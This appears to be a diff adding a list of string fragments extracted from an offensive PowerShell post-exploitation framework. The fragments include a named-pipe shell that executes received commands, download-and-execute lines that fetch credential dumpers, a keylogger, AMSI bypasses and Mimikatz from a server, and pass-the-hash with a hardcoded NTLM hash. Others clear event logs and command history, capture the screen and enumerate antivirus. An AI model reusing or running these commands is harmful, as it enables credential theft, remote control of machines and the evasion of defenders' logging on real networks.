@@ -1,0 +1,246 @@
+"'    msfvenom -p windows/x64/exec CMD=`""powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=`"" exitfunc=thread -b `""\x00`"" -f hex"
+"'"""
+"'$TempNet = netstat -anp tcp;$TempNet;Write-Output """";Write-Output ""[+] Resolving Foreign Addresses"";Write-Output """";$TempNet | Select-String -Pattern ""\s+\d+\.\d+\.\d+\.\d+:\d+\s+"" | ForEach-Object { ($_ -split ""\s+"")[3] -split "":"" | Select-Object -First 1 } | Where-Object { $_ -ne ""0.0.0.0"" -and $_ -ne ""127.0.0.1"" } | Sort-Object -Unique | ForEach-Object { try { ""$_ - "" + [System.Net.Dns]::GetHostEntry($_).HostName } catch { } }"
+"'$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator);$Isx64 = [System.Environment]::Is64BitProcess;if($isAdmin){Write-Output """";Write-Output ""[+] Processes sorted by ProcessName:"";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort ProcessName | ft -Autosize | Out-String -Width 4096;Write-Output ""[+] Processes sorted by Username:"";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort UserName,ProcessName | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output ""[+] Current Process [x64]:""}else{Write-Output ""[+] Current Process [x86]:""};Get-Process -IncludeUserName | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, UserName, Path | Sort ID | Format-Table -AutoSize | Out-String -Width 4096}else{Write-Output """";Write-Output ""[+] Processes sorted by PID:"";Get-Process | Select ID, ProcessName, SessionId, Path | Sort ID | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output ""[+] Current Process [x64]:""}else{Write-Output ""[+] Current Process [x86]:""};Get-Process | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, Path | Format-Table -AutoSize | Out-String -Width 4096}#"
+"'$usersDirectory = ""C:\Users"";$userDirs = Get-ChildItem -Path $usersDirectory -Directory;$userDirs.Name"
+"''`""sekurlsa::pth /user:Administrator /domain:ferrari.local /ntlm:217E50203A5ABA59CEFA863C724BF61B`"""
+"') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output "
+"')"" } else { ""LDAP://DC=$($Domain -replace "
+"');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"""");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq "
+"'){break};try{`$result=iex """"`$c 2>&1 | Out-String"""";`$result-split "
+"', "
+"', """
+"', 1, "
+"', [Convert]::FromBase64String("
+"',"
+"',1,"
+"',DC="
+"'Add-Type -AssemblyName System.Windows.Forms;$totalWidth = 1920;$totalHeight = 1080;$bitmap = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight);$graphics = [System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size);$memoryStream = New-Object System.IO.MemoryStream;$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png);$bytes = $memoryStream.ToArray();$base64String = [Convert]::ToBase64String($bytes);$memoryStream.Close();$base64String"
+"'Add-Type -AssemblyName System.Windows.Forms;$totalWidth = 3840;$totalHeight = 2160;$bitmap = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight);$graphics = [System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size);$memoryStream = New-Object System.IO.MemoryStream;$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png);$bytes = $memoryStream.ToArray();$base64String = [Convert]::ToBase64String($bytes);$memoryStream.Close();$base64String"
+"'Get-WmiObject Win32_Service | Where-Object {$_.State -eq ""Running""} | Select-Object DisplayName, Name, ProcessId, StartName"
+"'Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"";Write-Output ""[+] History Cleared"""
+"'WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct;Get-Service | Where-Object { $_.DisplayName -like ""*antivirus*"" };Get-Process | Where-Object { $_.Name -like ""*antivirus*"" };Get-Item -Path ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"""
+"'Write-Output ""[+] Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"""
+"'Write-Output ""[+] RDP Keylogger Loaded | Saving to c:\Users\Public\Documents | https://github.com/nocerainfosec/TakeMyRDP2.0"";Write-Output """";Write-Output ""[+] RDP Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"""
+"'Write-Output ""[+] TGT_Monitor started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"""
+"'[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;Write-Output ""[+] TLS Enabled"""
+"'^""|""$"
+"'^\d{1,3}(\.\d{1,3}){3}$"
+"'`"" | Set-WmiInstance -Arguments `@{OutputData = `$outputData; CommandStatus="
+"'wevtutil el | ForEach-Object {wevtutil cl ""$_""};Write-Output ""[+] Logs Cleared"""
+"'wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version"
+"'wmic startup get Caption,Command,Location,User"
+' 
+'                                           [Version: 1.0.4] https://github.com/Leo4j/Amnesiac
+'    Rubeus createnetonly /program:c:\windows\system32\cmd.exe /domain: /dc: /username: /password:fakepass /ptt /ticket:
+'    ShellGen powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=
+'  = $null  # Admin sessions don
+' -EA 0 > `$null; if(`$?){del 
+' -OutFile 
+' -Password 
+' -Username 
+' -and $commandParts[1] -eq 
+' -and $commandParts[1] -match 
+' -replace 
+' = 
+' = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join 
+'#END#
+'$($global:ServerURL)/Ask4Creds.ps1
+'$($global:ServerURL)/Dpapi.ps1
+'$($global:ServerURL)/Ferrari.ps1
+'$($global:ServerURL)/Find-LocalAdminAccess.ps1
+'$($global:ServerURL)/HiveDump.ps1
+'$($global:ServerURL)/Invoke-GrabTheHash.ps1
+'$($global:ServerURL)/Invoke-Patamenia.ps1
+'$($global:ServerURL)/Invoke-SMBRemoting.ps1
+'$($global:ServerURL)/Invoke-SessionHunter.ps1
+'$($global:ServerURL)/Invoke-WMIRemoting.ps1
+'$($global:ServerURL)/NETAMSI.ps1
+'$($global:ServerURL)/PInject.ps1
+'$($global:ServerURL)/PassSpray.ps1
+'$($global:ServerURL)/RDPKeylog.exe
+'$($global:ServerURL)/SimpleAMSI.ps1
+'$($global:ServerURL)/Suntour.ps1
+'$($global:ServerURL)/Sync.ps1
+'$($global:ServerURL)/TGT_Monitor.ps1
+'$($global:ServerURL)/Tkn_Access_Check.ps1
+'$($global:ServerURL)/Token-Impersonation.ps1
+'$($global:ServerURL)/Validate-Credentials.ps1
+'$($global:ServerURL)/cms.ps1
+'$($global:ServerURL)/dumper.ps1
+'$($global:ServerURL)/klg.ps1
+'$($global:ServerURL)/pwv.ps1
+'$([System.Net.Dns]::GetHostByName(($env:computerName)).HostName)
+'$ComputerName
+'$GuidOutput
+'$PN
+'$PipeName
+'$UserPath\$remoteFileName
+'$env:username
+'$fileContentBase64
+'$gzipcompressedBase64`
+'$historyFile
+'$pwd | Select-Object -ExpandProperty Path
+'$url
+''
+'';New-Item 
+'';Write-Output 
+'';iex(new-object net.webclient).downloadstring(
+'(?<=\[)\d+(?=\])
+') -OR ($command -eq 
+') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output 
+');Write-Output 
+');`$HashGrab = Invoke-GrabTheHash | Where-Object{`$_ -match 
+');iex(new-object net.webclient).downloadstring(
+'-enc $encCommand
+'-ep Bypass
+'.
+'.\Administrator
+'/
+'0
+'0x00000001
+'0x00000002
+'0x00000004
+'0x00000008
+'0x00000010
+'0x00000020
+'0x00000040
+'0x00000080
+'0x00000100
+'0x00000200
+'0x00000400
+'1
+'2
+'2>&1 
+'2^^^>^^^&1 ^^^
+'3
+'4
+';Write-Output 
+';`$process = Start-Process -FilePath 
+';iex(new-object net.webclient).downloadstring(
+'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+'Ask4Creds
+'Bidirectional
+'Bookmarks
+'Byte
+'C:\Users\Public\Documents\RDPLog.exe
+'CROSS_ORGANIZATION
+'CROSS_ORGANIZATION_NO_TGT_DELEGATION
+'Clipboard
+'Completed
+'ComputerName
+'CredValidate
+'DCSync
+'Disabled
+'DisplayComputerName
+'DisplayName
+'DisplayUserID
+'Domain
+'FILTER_SIDS
+'FOREST_TRANSITIVE
+'Find-LocalAdminAccess
+'GLSet
+'GLSet *
+'GListener
+'History
+'Identifier
+'Impersonation
+'InOut
+'Inbound
+'Loopback*
+'MIT
+'NON_TRANSITIVE
+'NTLM hash
+'None
+'Outbound
+'P@ssw0rd!
+'PIM_TRUST
+'PSRemoting
+'PassSpray
+'PipeClient
+'PipeName
+'PipeServer
+'RemotePath
+'S-1-1-0
+'SCMutex
+'SHost
+'SMB
+'SMBRemoting
+'SUser
+'SX
+'StreamReader
+'StreamWriter
+'System.Collections.Generic.List[System.Object]
+'System.Collections.Generic.List[psobject]
+'TREAT_AS_EXTERNAL
+'TRUST_USES_AES_KEYS
+'TRUST_USES_RC4_ENCRYPTION
+'UPLEVEL_ONLY
+'UniquePipeID
+'UserID
+'WINDOWS_ACTIVE_DIRECTORY
+'WINDOWS_NON_ACTIVE_DIRECTORY
+'WITHIN_FOREST
+'WMI
+'WMIRemoting
+'[+] .NET Patched
+'[+] DpapiDump Loaded | https://github.com/tmenochet/PowerDump
+'[+] HiveDump Loaded | https://github.com/tmenochet/PowerDump
+'[+] Invoke-GrabTheHash Loaded | https://github.com/Leo4j/Invoke-GrabTheHash
+'[+] Mimi Loaded | https://blog.gentilkiwi.com
+'[+] PInject Loaded | https://github.com/3xpl01tc0d3r/ProcessInjection
+'[+] Patched
+'[+] PowerView Loaded | https://github.com/PowerShellMafia/PowerSploit
+'[+] PowershellKerberos Loaded | https://github.com/MzHmO/PowershellKerberos
+'[+] Rubeus Loaded | https://github.com/GhostPack/Rubeus
+'[+] Tip: How to generate your hex shell code:
+'[+] Usage: Mimi -Command 
+'[+] Usage: PInject <pid> <shellcode_in_hex_format>
+'[+] Usage: Rubeus <command>
+'[-] HashGrab Failure
+'[-] No Access
+'[-] Please move to a writable directory
+'[^A-Za-z0-9.-]
+'\
+'\.
+'\..*
+'\\
+'\] 
+'\n\s*$
+'\s+
+'^\d+$
+'^\s*\n
+'_
+'`n
+'`r?`n
+'b64
+'bookmark
+'check
+'clear
+'dummyhostdropconnection
+'exe
+'exit
+'ferrari\Administrator
+'gzip
+'help
+'kill
+'kill all
+'pwraw
+'pwsh
+'quser;net sessions;query session;klist sessions
+'raw
+'scramble
+'screen4K
+'screenshot
+'sessions
+'switch
+'targets
+'tmpfile
+'toggle
+'unbookmark
+'whoami
+'whoami /all
+'|%{`$w.WriteLine(`$_)}};`$w.WriteLine(
+'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split 
+'};if(`$HashGrab){`$HashGrab}else{Write-Output 
+'}}else{Write-Output 
